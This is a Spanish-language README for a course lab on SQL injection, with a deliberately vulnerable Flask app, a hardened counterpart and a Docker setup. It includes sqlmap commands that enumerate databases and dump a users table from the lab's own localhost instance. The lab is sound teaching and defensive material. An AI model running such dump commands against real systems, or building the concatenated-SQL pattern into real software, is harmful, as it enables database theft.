# MBD303 - Seguridad en Bases de Datos
## Laboratorio de SQL Injection: Vulnerable vs Seguro

Este proyecto es una plataforma interactiva diseñada para demostrar, explotar y mitigar vulnerabilidades de **SQL Injection (SQLi)**. Contiene dos versiones de una misma aplicación para permitir una comparación directa entre prácticas de código inseguras y defensas robustas.

---

## 🚀 Inicio Rápido con Docker

El proyecto ahora cuenta con un entorno unificado. Puedes levantar ambas aplicaciones y los servicios necesarios con un solo comando.

### Requisitos
- Docker y Docker Compose
- Windows 11 (PowerShell recomendado)

### Despliegue Unificado
1. Clona el repositorio.
2. Abre una terminal en la raíz del proyecto.
3. Ejecuta:
   ```powershell
   docker-compose up -d
   ```

### Servicios Disponibles
| Aplicación | URL | Puerto DB | Estado |
| :--- | :--- | :--- | :--- |
| **v1.0 Vulnerable** | [http://localhost:5000](http://localhost:5000) | 3306 | 🛑 Inseguro |
| **v2.0 Segura** | [http://localhost:5001](http://localhost:5001) | 3307 | ✅ Protegido |
| **Redis Cache** | N/A | 6379 | ⚡ Performance |

---

## 📁 Estructura del Proyecto

```text
MBD303SeguridadBD/
├── docs/                   # 📚 Documentación detallada y guías
│   ├── COMPARISON.md       # Comparativa técnica Vulnerable vs Seguro
│   ├── SQLMAP_GUIDE.md     # Guía paso a paso de explotación con sqlmap
│   └── QUICK_START.md      # Guía de inicio rápido
├── v1.0-vulnerable/        # 🛑 Código con debilidades intencionales
│   └── app/                # Flask App con concatenación de SQL
├── v2.0-secure/            # ✅ Código con mejores prácticas
│   └── app/                # Flask App con Consultas Parametrizadas y Redis
├── docker-compose.yml      # Orquestación de todo el laboratorio
├── .env                    # Configuración centralizada de variables
└── README.md               # Este archivo
```

---

## 🔍 Guía de Explotación (sqlmap)

Asegúrate de tener `sqlmap` instalado (`pip install sqlmap`).

### 1. Detectar Vulnerabilidades (v1.0)
```powershell
sqlmap -u "http://localhost:5000/search?username=test" --dbs --batch
```

### 2. Extracción de Datos (Dumping)
```powershell
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T users --dump --batch
```

### 3. Prueba de Seguridad (v2.0)
Al intentar lo mismo contra la versión segura, `sqlmap` no encontrará puntos de inyección:
```powershell
sqlmap -u "http://localhost:5001/search?username=test" --batch
```

---

## 🛠️ Tecnologías y Seguridad

### Version 1.0 (Vulnerable)
- **Vulnerabilidad**: Concatenación directa de strings en consultas SQL.
- **Riesgo**: Bypass de autenticación, exfiltración de datos y manipulación de BD.

### Version 2.0 (Segura)
- **Defensa 1**: **Consultas Parametrizadas** (Prepared Statements).
- **Defensa 2**: **Sanitización** de inputs mediante expresiones regulares.
- **Defensa 3**: **Hashing** de contraseñas.
- **Extra**: Integración con **Redis** para optimización de queries.

---

## 📚 Documentación Adicional

- [Guía Detallada de SQLMap](docs/SQLMAP_GUIDE.md)
- [Comparativa de Seguridad](docs/COMPARISON.md)
- [Manual de Configuración](docs/setup_manual.md)

---

## ⚠️ Advertencia Legal
Este proyecto tiene fines **estrictamente educativos**. El uso de estas herramientas contra sistemas sin autorización es ilegal. El autor no se hace responsable del mal uso de este software.

---
**MBD303 - Seguridad en Bases de Datos**
*Desarrollado para el análisis y mitigación de vulnerabilidades web.*
